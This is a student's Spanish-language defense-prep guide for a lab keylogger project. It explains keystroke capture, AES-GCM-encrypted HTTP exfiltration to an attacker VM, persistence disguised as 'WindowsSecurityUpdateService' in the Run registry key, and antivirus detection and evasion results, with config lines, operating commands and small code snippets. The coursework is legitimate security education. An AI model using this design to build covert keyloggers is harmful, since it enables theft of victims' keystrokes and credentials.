# Preparación para la Defensa

**Estudiante:** Vejat Olea  
**Proyecto:** Unidad 2 — Keylogger Seguro

---

## Qué pueden pedirte en la defensa

Hay tres tipos de cosas: **explicar** cómo funciona algo, **demostrar** que funciona en la VM, o **modificar** el código en vivo. Abajo tienes respuestas preparadas y cambios fáciles que podrías tener que hacer.

---

## Preguntas frecuentes y respuestas

### ¿Por qué usaste Python y no C/C++?

Python nos permitió desarrollar y documentar rápido en el laboratorio. El proyecto exige entregar un `.exe`, y lo compilamos con PyInstaller. C/C++ sería menos detectable por antivirus, pero Python fue suficiente para demostrar los conceptos del curso.

### ¿Por qué AES-GCM y no MD5 o SHA?

Porque necesitamos **cifrar y luego descifrar**. Un hash es irreversible: solo sirve para comparar, no para recuperar las teclas. MD5 además está roto. AES-GCM cifra, autentica el mensaje y permite descifrar en el receptor.

### ¿Dónde está la clave y por qué?

Se genera en la primera ejecución y se guarda en `secret.key` junto al programa. No está hardcodeada en el código. En el lab la compartimos por la carpeta `Y:\`. La debilidad es que si alguien roba ese archivo en la víctima, puede descifrar todo.

### ¿Cómo funciona la persistencia?

Al ejecutarse, el keylogger llama a `install_persistence()`. Eso crea `run_keylogger.bat`, lo registra en `HKCU\...\Run` como `WindowsSecurityUpdateService` y lo copia a la carpeta de Inicio. El `.bat` espera 15 segundos (para que monte `Y:`), hace `cd` al directorio correcto y ejecuta el programa sin ventana.

### ¿Por qué un .bat y no Python directo en el registro?

Porque el registro apuntaba a un alias de Python de la Microsoft Store de 0 bytes que no funciona al arrancar Windows. El `.bat` usa la ruta real de `pythonw.exe` y fija el directorio de trabajo.

### ¿Por qué Wireshark en la VM atacante y no en el host?

El tráfico entre las dos VMs (`.107` → `.108`) va directo por el switch interno de VirtualBox. La tarjeta del host (`192.168.56.1`) no ve esos paquetes. Por eso capturamos en la VM atacante.

### ¿Qué demuestra el MITM?

Que alguien puede **ver** los POST HTTP periódicos, pero el campo `payload` es base64 cifrado. Sin `secret.key` no se leen las teclas. El script `demo_mitm_decrypt.py --demo` lo demuestra con un error `InvalidTag`.

### ¿Por qué VirusTotal detecta solo 19/69?

PyInstaller genera binarios grandes con alta entropía que muchos motores desconfían. ESET y Kaspersky detectan keylogger Python directamente. Microsoft y Avast no lo marcaron en nuestro análisis. Evasión total es difícil; logramos evasión parcial.

### ¿Qué no captura tu keylogger?

Contraseñas en navegadores (campos protegidos), teclas en sesiones UAC elevadas, portapapeles, ratón y teclado virtual. Está documentado en `docs/analisis_limitaciones.md`.

### ¿Por qué HTTP y no HTTPS?

En el laboratorio simplificamos la comunicación. La confidencialidad la da el **cifrado de aplicación** (AES-GCM), no el canal TLS. En producción se usaría HTTPS además.

---

## Cambios que podrían pedirte en vivo

### 1. Cambiar el intervalo de envío

**Archivo:** `src/config.py`  
**Línea:** `SEND_INTERVAL = 20`  
**Ejemplo:** cambiar a `10` o `30`, reiniciar keylogger y mostrar que envía más o menos seguido.

### 2. Cambiar la IP del atacante

**Archivo:** `src/config.py`  
**Línea:** `SERVER_URL = "http://192.168.56.108:5000/upload"`  
**Qué decir:** "Si cambia la IP de la VM atacante, actualizo esta URL y reinicio el keylogger."

### 3. Cambiar el nombre de persistencia

**Archivo:** `src/config.py`  
**Línea:** `APP_NAME = "WindowsSecurityUpdateService"`  
Luego ejecutar `python persistence.py remove` y `python persistence.py install` para registrar el nuevo nombre.

### 4. Agregar el nombre del equipo al payload

**Archivo:** `src/exfiltration.py`, dentro de `send_encrypted_data`:

```python
import socket
data = {
    "timestamp": datetime.utcnow().isoformat() + "Z",
    "hostname": socket.gethostname(),
    "payload": encrypted_payload,
}
```

**Qué decir:** "Agregué metadatos para identificar de qué máquina vienen los logs."

### 5. Desactivar persistencia temporalmente

**Archivo:** `src/keylogger.py`  
Comentar la línea:

```python
# install_persistence(get_default_entrypoint())
```

**Qué decir:** "Para pruebas sin modificar el registro, comento esta línea."

### 6. Mostrar limpieza de persistencia

En la VM víctima:

```powershell
cd Y:\src
python persistence.py remove
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

### 7. Cambiar tecla de parada

**Archivo:** `src/keylogger.py`, función `on_release`  
Cambiar `keyboard.Key.esc` por otra tecla si lo piden. Explicar que ESC es solo para pruebas en VM.

### 8. Demostrar descifrado MITM en vivo

```powershell
cd Y:\src
python demo_mitm_decrypt.py --demo
```

---

## Flujo del programa (si te piden explicar el código)

```
keylogger.py arranca
    → os.chdir(get_app_dir())          # fija directorio de trabajo
    → install_persistence()            # registra en Windows
    → hilo daemon: exfiltration_loop() # envía cada SEND_INTERVAL seg
    → hilo principal: capture_loop()   # pynput escucha teclado

Cada tecla → on_press() → buffer (con lock)
Cada 20 s  → encrypt() → send_encrypted_data() → POST /upload
Receptor   → decrypt() → muestra y guarda en received_logs.txt
```

---

## Archivos que debes conocer de memoria

| Archivo | Para qué sirve |
|---|---|
| `keylogger.py` | Captura, cifrado, envío, activa persistencia |
| `persistence.py` | Registro, Startup, crea el `.bat` |
| `crypto_utils.py` | generate_key, encrypt, decrypt (AES-GCM) |
| `exfiltration.py` | POST HTTP al atacante |
| `receiver.py` | Flask en puerto 5000, descifra |
| `config.py` | IP, intervalo, nombre de persistencia |
| `app_paths.py` | Rutas que funcionan en .py y en .exe |

---

## Comandos para tener listos en la VM

```powershell
# Receptor
cd Y:\src && python receiver.py

# Keylogger
cd Y:\src && python keylogger.py

# Persistencia
python persistence.py install
python persistence.py remove

# Demo MITM
python demo_mitm_decrypt.py --demo

# Ver registro
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSecurityUpdateService

# Compilar
cd Y:\build && .\build.ps1
```

---

## Errores comunes en la defensa (y cómo responder)

**"El keylogger no envía datos"**  
→ Verificar que el receptor esté corriendo primero, que `SERVER_URL` tenga la IP correcta y que `ping 192.168.56.108` funcione desde la víctima.

**"La persistencia no arranca"**  
→ Revisar que `Y:` esté montada, que el `.bat` exista y que apunte a `pythonw.exe` real, no al alias de la Store.

**"Wireshark no muestra nada"**  
→ Capturar en la VM atacante, no en el host. Filtro: `tcp.port == 5000`.

**"¿Es ético?"**  
→ "Solo se probó en VMs propias del laboratorio, con fines educativos, nunca en equipos de terceros."

---

## Checklist el día de la defensa

- [ ] VMs encendidas y red Host-Only funcionando
- [ ] Carpeta `Y:\` montada en ambas VMs
- [ ] `secret.key` presente en `Y:\src`
- [ ] Proyecto abierto en el editor
- [ ] Capturas de respaldo por si falla algo en vivo
- [ ] Saber dónde está cada configuración (`config.py`)
- [ ] Saber limpiar persistencia al terminar